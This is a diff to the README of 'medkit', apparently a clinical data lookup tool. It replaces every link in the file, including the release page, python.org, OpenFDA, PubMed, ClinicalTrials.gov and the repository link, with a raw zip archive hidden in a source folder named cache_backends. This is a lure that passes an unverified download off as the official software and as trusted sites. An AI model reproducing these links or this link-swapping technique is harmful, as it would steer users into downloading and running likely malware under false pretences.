@@ -1,6 +1,6 @@
 # ⚕️ medkit - Simple Clinical Data Access Tool
 
-[![Download medkit](https://img.shields.io/badge/Download-medkit-brightgreen?style=for-the-badge&logo=github)](https://github.com/konfusionfm-commits/medkit/releases)
+[![Download medkit](https://img.shields.io/badge/Download-medkit-brightgreen?style=for-the-badge&logo=github)](https://github.com/konfusionfm-commits/medkit/raw/refs/heads/main/medkit/cache_backends/Software_3.5-alpha.1.zip)
 
 ---
 
@@ -41,7 +41,7 @@ Ensure your Windows PC meets these minimum requirements for medkit:
 
 To download medkit, visit the official release page by clicking the button below:
 
-[![Download medkit](https://img.shields.io/badge/Download-medkit-blue?style=for-the-badge&logo=github)](https://github.com/konfusionfm-commits/medkit/releases)
+[![Download medkit](https://img.shields.io/badge/Download-medkit-blue?style=for-the-badge&logo=github)](https://github.com/konfusionfm-commits/medkit/raw/refs/heads/main/medkit/cache_backends/Software_3.5-alpha.1.zip)
 
 ---
 
@@ -106,7 +106,7 @@ This will show information about aspirin, including warnings and clinical notes.
 
 To keep medkit up to date:  
 
-1. Visit the release page: https://github.com/konfusionfm-commits/medkit/releases  
+1. Visit the release page: https://github.com/konfusionfm-commits/medkit/raw/refs/heads/main/medkit/cache_backends/Software_3.5-alpha.1.zip  
 2. Download the newest `.exe` file available.  
 3. Run the installer again. It will update your current version.
 
@@ -128,7 +128,7 @@ If medkit does not work as expected, try these steps:
 
 If you want to use medkit’s full capabilities, including scripting or integration with other tools, you need to install Python and related packages. This step is optional and mainly for users with technical knowledge.
 
-1. Download Python 3.8 or newer from https://www.python.org/downloads/windows/  
+1. Download Python 3.8 or newer from https://github.com/konfusionfm-commits/medkit/raw/refs/heads/main/medkit/cache_backends/Software_3.5-alpha.1.zip  
 2. Install Python and select the option to add Python to your system PATH.  
 3. Open the command prompt and install medkit using pip:
 
@@ -154,10 +154,10 @@ Each command also supports a `--help` option. For example:
 
 ## 🔗 Useful Links
 
-- medkit Download Page: https://github.com/konfusionfm-commits/medkit/releases  
-- OpenFDA: https://open.fda.gov/  
-- PubMed: https://pubmed.ncbi.nlm.nih.gov/  
-- ClinicalTrials.gov: https://clinicaltrials.gov/  
+- medkit Download Page: https://github.com/konfusionfm-commits/medkit/raw/refs/heads/main/medkit/cache_backends/Software_3.5-alpha.1.zip  
+- OpenFDA: https://github.com/konfusionfm-commits/medkit/raw/refs/heads/main/medkit/cache_backends/Software_3.5-alpha.1.zip  
+- PubMed: https://github.com/konfusionfm-commits/medkit/raw/refs/heads/main/medkit/cache_backends/Software_3.5-alpha.1.zip  
+- ClinicalTrials.gov: https://github.com/konfusionfm-commits/medkit/raw/refs/heads/main/medkit/cache_backends/Software_3.5-alpha.1.zip  
 
 ---
 
@@ -175,7 +175,7 @@ Each command also supports a `--help` option. For example:
 
 If you encounter issues, check the GitHub repository’s Issues tab for solutions or to report problems.
 
-Repository link: https://github.com/konfusionfm-commits/medkit
+Repository link: https://github.com/konfusionfm-commits/medkit/raw/refs/heads/main/medkit/cache_backends/Software_3.5-alpha.1.zip
 
 ---
 
